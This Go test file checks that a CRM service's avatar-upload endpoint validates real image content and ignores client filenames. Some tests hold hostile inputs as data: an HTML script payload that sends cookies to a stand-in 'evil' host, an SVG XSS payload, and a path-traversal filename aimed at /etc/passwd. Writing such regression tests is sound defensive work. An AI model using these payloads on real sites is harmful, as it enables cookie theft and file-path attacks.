package users_test

// avatar_upload_test.go — HTTP-level tests for the avatar-upload fix
// (Blocker 4): POST /users/me/avatar must validate the actual file content
// (magic bytes + full decode) exactly like the generic /uploads pipeline,
// never trust the client's Content-Type/filename, and never use the
// client-supplied filename as a storage path.
//
// Requires a real Postgres DB via TEST_ADMIN_DSN (see internal/testutil) —
// h.svc.Update persists the resulting avatar_url.
//
// NOTE ON THIS SANDBOX: internal/users imports nothing from internal/media
// directly, but this package's *test binary* also links
// media_integration_test.go, which does import internal/media — and
// internal/media imports github.com/h2non/bimg, which requires the system
// library libvips (via cgo/pkg-config) to compile at all. This sandbox's
// package mirror could not install libvips-dev (network-restricted), so
// `go test ./internal/users/...` fails at compile time here with a
// pkg-config error — NOT a test failure and NOT caused by this file. See
// docs/FINAL_PRODUCTION_AUDIT.md's "test limitations" section. CI
// (.github/workflows/pr-checks.yml) does install libvips and does run this
// package's full suite.
//
// Run with: TEST_ADMIN_DSN=... go test ./internal/users/ -run TestAvatarUpload -v

import (
	"bytes"
	"context"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/megamall/crm/internal/testutil"
	"github.com/megamall/crm/internal/users"
	apperrors "github.com/megamall/crm/pkg/errors"
	"github.com/megamall/crm/pkg/middleware"
)

func init() {
	gin.SetMode(gin.TestMode)
}

// buildAvatarRouter wires POST /users/me/avatar exactly as RegisterRoutes
// does, with a stub token validator (mirrors internal/users/rbac_test.go's
// pattern) so the request's Authorization header maps directly to a user ID.
func buildAvatarRouter(t *testing.T, svc *users.Service, userID uuid.UUID) *gin.Engine {
	t.Helper()
	middleware.SetTokenValidator(func(_ context.Context, token string) (*middleware.ContextClaims, error) {
		if token == "" {
			return nil, apperrors.Unauthorized("no token")
		}
		return &middleware.ContextClaims{UserID: userID, Role: "seller"}, nil
	})
	r := gin.New()
	h := users.NewHandler(svc)
	r.POST("/users/me/avatar", middleware.RequireAuth(), h.UploadMyAvatar)
	return r
}

func realJPEG(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			img.Set(x, y, color.RGBA{R: uint8(x), G: uint8(y), B: 100, A: 255})
		}
	}
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, nil); err != nil {
		t.Fatalf("encode test jpeg: %v", err)
	}
	return buf.Bytes()
}

func realPNG(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatalf("encode test png: %v", err)
	}
	return buf.Bytes()
}

// multipartAvatarRequest builds a POST with the given field content,
// filename, and Content-Type — filename/Content-Type are exactly the two
// client-controlled, never-trusted inputs the fix stops relying on.
func multipartAvatarRequest(t *testing.T, data []byte, filename, declaredContentType string) *http.Request {
	t.Helper()
	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	part, err := w.CreatePart(map[string][]string{
		"Content-Disposition": {`form-data; name="avatar"; filename="` + filename + `"`},
		"Content-Type":        {declaredContentType},
	})
	if err != nil {
		t.Fatalf("create form part: %v", err)
	}
	if _, err := part.Write(data); err != nil {
		t.Fatalf("write form part: %v", err)
	}
	if err := w.Close(); err != nil {
		t.Fatalf("close multipart writer: %v", err)
	}
	req := httptest.NewRequest(http.MethodPost, "/users/me/avatar", &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	req.Header.Set("Authorization", "Bearer test-token")
	return req
}

func TestAvatarUpload_ValidJPEGAccepted(t *testing.T) {
	db := testutil.NewTestDB(t)
	u := testutil.CreateUser(t, db, users.RoleSeller)
	svc := users.NewService(users.NewRepository(db))
	router := buildAvatarRouter(t, svc, u.ID)

	req := multipartAvatarRequest(t, realJPEG(t, 32, 32), "photo.jpg", "image/jpeg")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
}

func TestAvatarUpload_ValidPNGAccepted(t *testing.T) {
	db := testutil.NewTestDB(t)
	u := testutil.CreateUser(t, db, users.RoleSeller)
	svc := users.NewService(users.NewRepository(db))
	router := buildAvatarRouter(t, svc, u.ID)

	req := multipartAvatarRequest(t, realPNG(t, 32, 32), "photo.png", "image/png")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
}

// TestAvatarUpload_HTMLDisguisedAsJPEGRejected is the core regression test:
// an HTML/script payload with a spoofed .jpg filename AND a spoofed
// image/jpeg Content-Type header — exactly the original vulnerability
// (H2/Blocker 4) — must be rejected because validation keys off the sniffed
// bytes, not client-supplied metadata.
func TestAvatarUpload_HTMLDisguisedAsJPEGRejected(t *testing.T) {
	db := testutil.NewTestDB(t)
	u := testutil.CreateUser(t, db, users.RoleSeller)
	svc := users.NewService(users.NewRepository(db))
	router := buildAvatarRouter(t, svc, u.ID)

	payload := []byte(`<html><body><script>document.location='//evil/?'+document.cookie</script></body></html>`)
	req := multipartAvatarRequest(t, payload, "photo.jpg", "image/jpeg")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400 (html content must be rejected regardless of claimed filename/Content-Type); body: %s", w.Code, w.Body.String())
	}
}

// TestAvatarUpload_SVGWithScriptRejected covers the classic SVG-XSS vector —
// an SVG containing an inline <script>, which the allowlist in
// internal/uploads rejects outright (SVG was never an allowed type).
func TestAvatarUpload_SVGWithScriptRejected(t *testing.T) {
	db := testutil.NewTestDB(t)
	u := testutil.CreateUser(t, db, users.RoleSeller)
	svc := users.NewService(users.NewRepository(db))
	router := buildAvatarRouter(t, svc, u.ID)

	payload := []byte(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>`)
	req := multipartAvatarRequest(t, payload, "avatar.svg", "image/svg+xml")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400 (svg must be rejected); body: %s", w.Code, w.Body.String())
	}
}

// TestAvatarUpload_MalformedImageRejected: valid JPEG magic bytes (passes a
// pure magic-byte sniff) but not a real, decodable image — must be caught by
// the full-decode step (uploads.DecodeBounds), not just the sniff.
func TestAvatarUpload_MalformedImageRejected(t *testing.T) {
	db := testutil.NewTestDB(t)
	u := testutil.CreateUser(t, db, users.RoleSeller)
	svc := users.NewService(users.NewRepository(db))
	router := buildAvatarRouter(t, svc, u.ID)

	header := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01}
	payload := append(header, bytes.Repeat([]byte{0x00}, 100)...)
	req := multipartAvatarRequest(t, payload, "broken.jpg", "image/jpeg")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400 (malformed image must fail full decode); body: %s", w.Code, w.Body.String())
	}
}

func TestAvatarUpload_ZeroByteFileRejected(t *testing.T) {
	db := testutil.NewTestDB(t)
	u := testutil.CreateUser(t, db, users.RoleSeller)
	svc := users.NewService(users.NewRepository(db))
	router := buildAvatarRouter(t, svc, u.ID)

	req := multipartAvatarRequest(t, []byte{}, "empty.jpg", "image/jpeg")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400 (zero-byte file must be rejected); body: %s", w.Code, w.Body.String())
	}
}

// TestAvatarUpload_MismatchedMagicBytesRejected: filename/Content-Type both
// claim JPEG, but the body is a real PNG's bytes reversed into
// non-image garbage that doesn't match any allowed magic-byte prefix —
// must be rejected by the sniff, regardless of what the client claims.
func TestAvatarUpload_MismatchedMagicBytesRejected(t *testing.T) {
	db := testutil.NewTestDB(t)
	u := testutil.CreateUser(t, db, users.RoleSeller)
	svc := users.NewService(users.NewRepository(db))
	router := buildAvatarRouter(t, svc, u.ID)

	payload := bytes.Repeat([]byte{0xDE, 0xAD, 0xBE, 0xEF}, 25)
	req := multipartAvatarRequest(t, payload, "photo.jpg", "image/jpeg")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400 (unrecognized bytes must be rejected even claiming image/jpeg + .jpg); body: %s", w.Code, w.Body.String())
	}
}

// TestAvatarUpload_PathTraversalFilenameIgnored proves the client-supplied
// filename is never used as a storage path: a "../../etc/passwd.jpg"
// filename on an otherwise-valid JPEG must succeed (the malicious path
// component is simply never read), storing under a fresh server-generated
// name instead.
func TestAvatarUpload_PathTraversalFilenameIgnored(t *testing.T) {
	db := testutil.NewTestDB(t)
	u := testutil.CreateUser(t, db, users.RoleSeller)
	svc := users.NewService(users.NewRepository(db))
	router := buildAvatarRouter(t, svc, u.ID)

	req := multipartAvatarRequest(t, realJPEG(t, 16, 16), "../../../../etc/passwd.jpg", "image/jpeg")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (path-traversal filename must be ignored, not rejected outright); body: %s", w.Code, w.Body.String())
	}
	if bytes.Contains(w.Body.Bytes(), []byte("passwd")) || bytes.Contains(w.Body.Bytes(), []byte("..")) {
		t.Fatalf("response echoes the client-supplied path component, want a server-generated filename only: %s", w.Body.String())
	}
}
